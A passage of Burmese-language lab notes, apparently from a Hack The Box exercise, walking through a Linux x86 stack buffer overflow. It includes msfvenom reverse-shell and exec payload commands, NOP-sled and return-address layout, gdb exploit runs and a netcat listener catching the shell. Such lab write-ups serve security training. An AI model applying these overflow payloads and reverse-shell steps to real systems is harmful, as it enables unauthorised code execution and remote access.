##### other way (just direct command not shell)
```bash

msfvenom -p linux/x86/exec CMD="cat /root/flag.txt" --bad-chars "\x00\x09\x0a\x20" --format python --arch x86 --platform linux
```


---

#### Shell code length

ငါတို့လိုချင်တဲ့ action (reverse shell) ကို လုပ်ဖို့ shellcode အတွက် နေရာ ဘယ်လောက်ရှိသလဲ ဆိုတာ ရှာရမယ်


```bash
K1ll3rRanger@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c



No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
```
ဒါကြောင့် payload က 68 bytes လောက်ရှိမယ်လို့ သိရတယ်။ ဒါပေမယ့် နောက်မှ သတ်မှတ်ချက်တွေ (bad chars, encoder) ထည့်ရင် shellcode က ပိုကြီးလာနိုင်တယ်။ ဒါကြောင့် ကြိုတင်ပြီး နေရာ ပိုယူထားသင့်

shellcode မစခင် NOP instructions (`\x90`) တွေ ထည့်တာက အတော်လေး အသုံးဝင်တယ်။ ဘာလို့လဲဆိုတော့-
- CPU က NOP ကိုတွေ့ရင် ဘာမှမလုပ်ဘဲ ရှေ့ဆက်သွားတယ်
- EIP က NOP sled ထဲက ဘယ်နေရာကိုမဆို ညွှန်ပြရင် shellcode ဆီ ရောက်သွားမယ်
- ဒါက execution ကို ပိုပြီး stable ဖြစ်စေ

#### Generating shell code


Shellcode မထုတ်ခင် အောက်ပါ အချက်တွေ မှန်ကန်ဖို့ လို
- Architecture (CPU အမျိုးအစား - x86, x64, ARM စသည်)
- Platform (`linux`, windows, `macos` စသည်)
- Bad Characters (shellcode ထဲမှာ မပါသင့်တဲ့ စာလုံးများ)

` MSFvenom Syntax`
```bash
K1ll3rRanger@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```

- `-p linux/x86/shell_reverse_tcp` - payload အမျိုးအစား (reverse shell)
- `lhost` - ကိုယ့် IP လိပ်စာ
- `lport` - ကိုယ်သုံးမယ့် port
- `--format c` - C language format နဲ့ ထုတ်ပေးပါ
- `--arch x86` - 32-bit x86 architecture အတွက်
- `--platform linux` - Linux platform အတွက်
- `--bad-chars` - မပါသင့်တဲ့ စာလုံးတွေ (null, tab, newline, space စသည်)
- `--out` - output file နာမည်



```bash
K1ll3rRanger@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
```


ဒီမှာ `--bad-chars` ထဲမှာ `\x00` (null), `\x09` (tab), `\x0a` (newline), `\x20` (space) တွေ မပါအောင် ထည့်ထားတယ်။

Output က-

- Encoder အမျိုးအစား 11 ခု တွေ့ရတယ်
- `x86/shikata_ga_nai` encoder ကို သုံးတယ်
- Payload size - 95 bytes
- Final c file size - 425 bytes
- နာမည် `shellcode` နဲ့ သိမ်းတယ်

```bash
K1ll3rRanger@htb[/htb]$ cat shellcode

unsigned char buf[] = 
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
...
```


Shellcode ရပြီဆိုတာနဲ့ exploit ထဲမှာ နေရာချရမယ်။ Memory layout ကို အောက်ပါအတိုင်း ခွဲခြမ်း
```text
Buffer      = "\x55" * (1040 - 124 - 95 - 4) = 817 bytes
NOPs        = "\x90" * 124 bytes
Shellcode   = 95 bytes
EIP         = "\x66" * 4 bytes
```

- စုစုပေါင်း buffer size = 1040 bytes
- NOP sled = 124 bytes (ခန့်မှန်း)
- Shellcode = 95 bytes
- EIP overwrite = 4 bytes
- ကျန်တဲ့ 817 bytes ကို filler (`\x55`) နဲ့ ဖြည့်


`Run in gdb`
```bash
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\x5a\x22\xa2" + "\x66" * 4')
```

ဒီမှာ `\x90` က NOP (No Operation) instruction ပါ။ CPU က NOP ကိုတွေ့ရင် ဘာမှမလုပ်ဘဲ ရှေ့ဆက်သွားတယ်။ NOP sled က shellcode ကို "စလိုက်" တာမျိုး


`check in stack`
```bash
(gdb) x/2000xb $esp+550
#ဒီ command က stack pointer (ESP) ကနေ 550 byte အကွာကနေ စပြီး memory bytes 2000 ကို hexadecimal နဲ့ ပြခိုင်းတယ်




0xffffd64c: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd654: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd65c: 0x90    0x90    0xda    0xca    0xba    0xe4    0x11    0xd4
```

ပထမဆုံး NOP တွေ (`0x90`) ကောင်းကောင်းရောက်နေပြီး နောက်မှာ shellcode ရဲ့ ပထမဆုံး bytes (`0xda`, `0xca`, `0xba`...) စတင်နေတာကို တွေ့ရတယ်
ဒါက shellcode က memory ထဲကို အောင်မြင်စွာ ရောက်ရှိသွားပြီဆိုတဲ့ sign

ဒီအဆင့်ပြီးရင် EIP ကို NOP sled ထဲက ဘယ်နေရာကိုမဆို ညွှန်ပြဖို့ပဲ လို
ပြီးရင် shellcode ကို execute လုပ်ပြီး reverse shell ရ



Shellcode နဲ့ EIP ကို ငါတို့ ထိန်းချုပ်နိုင်ပြီဆိုတာ
စစ်ဆေးပြီးသွားရင် နောက်တစ်ဆင့်က NOP တွေ ရှိနေတဲ့ memory address တစ်ခုကို ရှာဖွေပြီး EIP ကို အဲဒီ address ဆီ ခုန်ခိုင်းရမယ်
ဒီ memory address မှာ အရင်က တွေ့ထားတဲ့ bad characters တွေ မပါရ


```bash
(gdb) x/2000xb $esp+1400
```

ဒီ command က stack pointer ကနေ 1400 bytes အကွာကနေ စပြီး 2000 bytes ကို ဖော်ပြခိုင်းတယ်။

Output ထဲမှာ တွေ့ရမှာက-
```
0xffffd5ec: 0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd5f4: 0x55    0x55    0x55    0x55    0x55    0x55    0x90    0x90
                                # "\x55" တွေ ဆုံးတဲ့နေရာ ---->|  |---> NOPs စတယ်
0xffffd5fc: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd604: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
...
0xffffd65c: 0x90    0x90    0xda    0xca    0xba    0xe4    0x11    0xd4
                         # |---> Shellcode စတယ်
```

ဒီနေရာမှာ NOP တွေ (`0x90`) ရှိနေတဲ့ address တစ်ခုကို ရွေးရမယ်။ ဥပမာ ဒီထဲက `0xffffd64c` ကို ရွေးလိုက်မယ်။



```
Buffer   = "\x55" * (1040 - 100 - 95 - 4) = 841 bytes
NOPs     = "\x90" * 100 bytes
Shellcode = 95 bytes (msfvenom နဲ့ ထုတ်ထားတာ)
EIP      = "\x4c\xd6\xff\xff" (ပြောင်းပြန်ရေးရမယ် - little-endian)
```



Shellcode က reverse shell ဖန်တီးမှာဖြစ်လို့ `netcat` နဲ့ listener ကို port 31337 မှာ ဖွင့်ထားရမယ်-

```bash
student@nix-bow:$ nc -nlvp 31337
Listening on [0.0.0.0] (family 0, port 31337)
```



Listener စပြီးရင် GDB ထဲမှာ exploit ကို ထပ်ပြီး run လိုက်တယ်-
`(program က root id ဆို command line ထဲမှာ run ရမယ် မဟုတ်ရင် reverse shell က root access မရ
`gdb ထဲမှာ SUID binary ကို debug လုပ်ရင် SUID bit အလုပ်မလုပ်ဘူး — ဒါက security feature ဖြစ်တယ်`
`gdb က program ကို real user (အနေနဲ့ပဲ run တယ်)`

```bash
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```



အောင်မြင်ရင် `netcat` မှာ အောက်ပါအတိုင်း ပြလိမ့်မယ်-

```
Listening on [0.0.0.0] (family 0, port 31337)
Connection from 127.0.0.1 33504 received!
```



Connection ရပြီဆိုပေမယ့် shell ဟုတ်မဟုတ် သေချာမသိရဘူး။ ဒါကြောင့် `id` command ကို ရိုက်ထည့်ပြီး user အကြောင်း အချက်အလက်ရဲ့-

```bash
id
uid=1000(student) gid=1000(student) groups=1000(student),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

ဒီလို return value ပြန်ရတယ်ဆိုရင် shell ထဲကို ရောက်နေပြီဆိုတာ သိနိုင်

---
